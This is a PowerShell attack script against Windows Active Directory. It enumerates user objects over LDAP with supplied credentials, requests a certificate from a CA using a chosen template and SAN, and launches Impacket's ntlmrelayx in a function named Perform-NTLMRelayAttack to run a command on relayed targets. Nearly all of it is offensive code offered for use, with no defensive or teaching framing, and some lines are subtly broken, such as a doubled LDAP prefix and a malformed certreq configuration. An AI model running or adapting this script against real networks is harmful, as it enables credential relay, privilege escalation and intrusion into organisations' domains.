# PowerShell Script to Perform LDAP Queries and Request Certificates

# Function to perform LDAP query and return results
function Perform-LDAPQuery {
    param(
        [string]$ldapServer,
        [string]$ldapUsername,
        [string]$ldapPassword
    )

    try {
        # Set up the LDAP connection
        $directoryEntry = New-Object DirectoryServices.DirectoryEntry("LDAP://$ldapServer", $ldapUsername, $ldapPassword)
        $ldapConnection = New-Object DirectoryServices.DirectorySearcher($directoryEntry)
        $ldapConnection.Filter = "(objectClass=user)"  # Specify more precise search filter
       
        # Perform the LDAP query
        $results = $ldapConnection.FindAll()

        # Return the results of the query
        $results | ForEach-Object {
            $_.Properties
        }
    } catch {
        Write-Host "Error in LDAP query: $_"
    }
}

# Function to request a certificate
function Request-Certificate {
    param(
        [string]$caServer,
        [string]$certTemplate
    )

    try {
        # Define the certificate request file
        $requestFile = "C:\temp\request.inf"
        $responseFile = "C:\temp\response.cer"
        
        # Create a request INF file for the certificate template
        $infContent = @"
[Version]
Signature = "\$Windows NT\$"

[NewRequest]
Subject = "CN=example.com"
KeySpec = 1
KeyUsage = 0xA0
MachineKeySet = TRUE
ProviderName = "Microsoft RSA SChannel Cryptographic Provider"
RequestType = PKCS10
RequestAttributes = "CertificateTemplate:$certTemplate"
[Extensions]
2.5.29.17 = "{text}"
_continue = "dns=example.com"
"@
        $infContent | Out-File -FilePath $requestFile

        # Run certreq to submit the request to the CA server
        $certReqCmd = "certreq -submit -config $caServer\$certTemplate $requestFile $responseFile"
        Invoke-Expression $certReqCmd
        
        Write-Host "Certificate requested successfully!"
    } catch {
        Write-Host "Error requesting certificate: $_"
    }
}

# Function to perform a relay attack using ntlmrelayx.py (requires Impacket)
function Perform-NTLMRelayAttack {
    param(
        [string]$targetFile,
        [string]$command
    )

    try {
        # Path to Impacket's ntlmrelayx.py script
        $impacketPath = "C:\Path\to\impacket\ntlmrelayx.py"
        $arguments = "-tf $targetFile -c $command"
        
        # Start the process
        Start-Process -FilePath $impacketPath -ArgumentList $arguments
        Write-Host "NTLM relay attack initiated."
    } catch {
        Write-Host "Error in NTLM relay attack: $_"
    }
}

# Main execution
$ldapServer = "ldap://example.com"
$ldapUsername = "username"
$ldapPassword = "password"

# Perform the LDAP query
Write-Host "Performing LDAP query..."
Perform-LDAPQuery -ldapServer $ldapServer -ldapUsername $ldapUsername -ldapPassword $ldapPassword

# Request a certificate from the CA
$caServer = "CA.example.com"
$certTemplate = "WebServer"
Write-Host "Requesting certificate..."
Request-Certificate -caServer $caServer -certTemplate $certTemplate

# Run NTLM relay attack (if you have the Impacket tools installed)
$targetFile = "target.txt"
$command = "whoami"
Write-Host "Running NTLM relay attack..."
Perform-NTLMRelayAttack -targetFile $targetFile -command $command
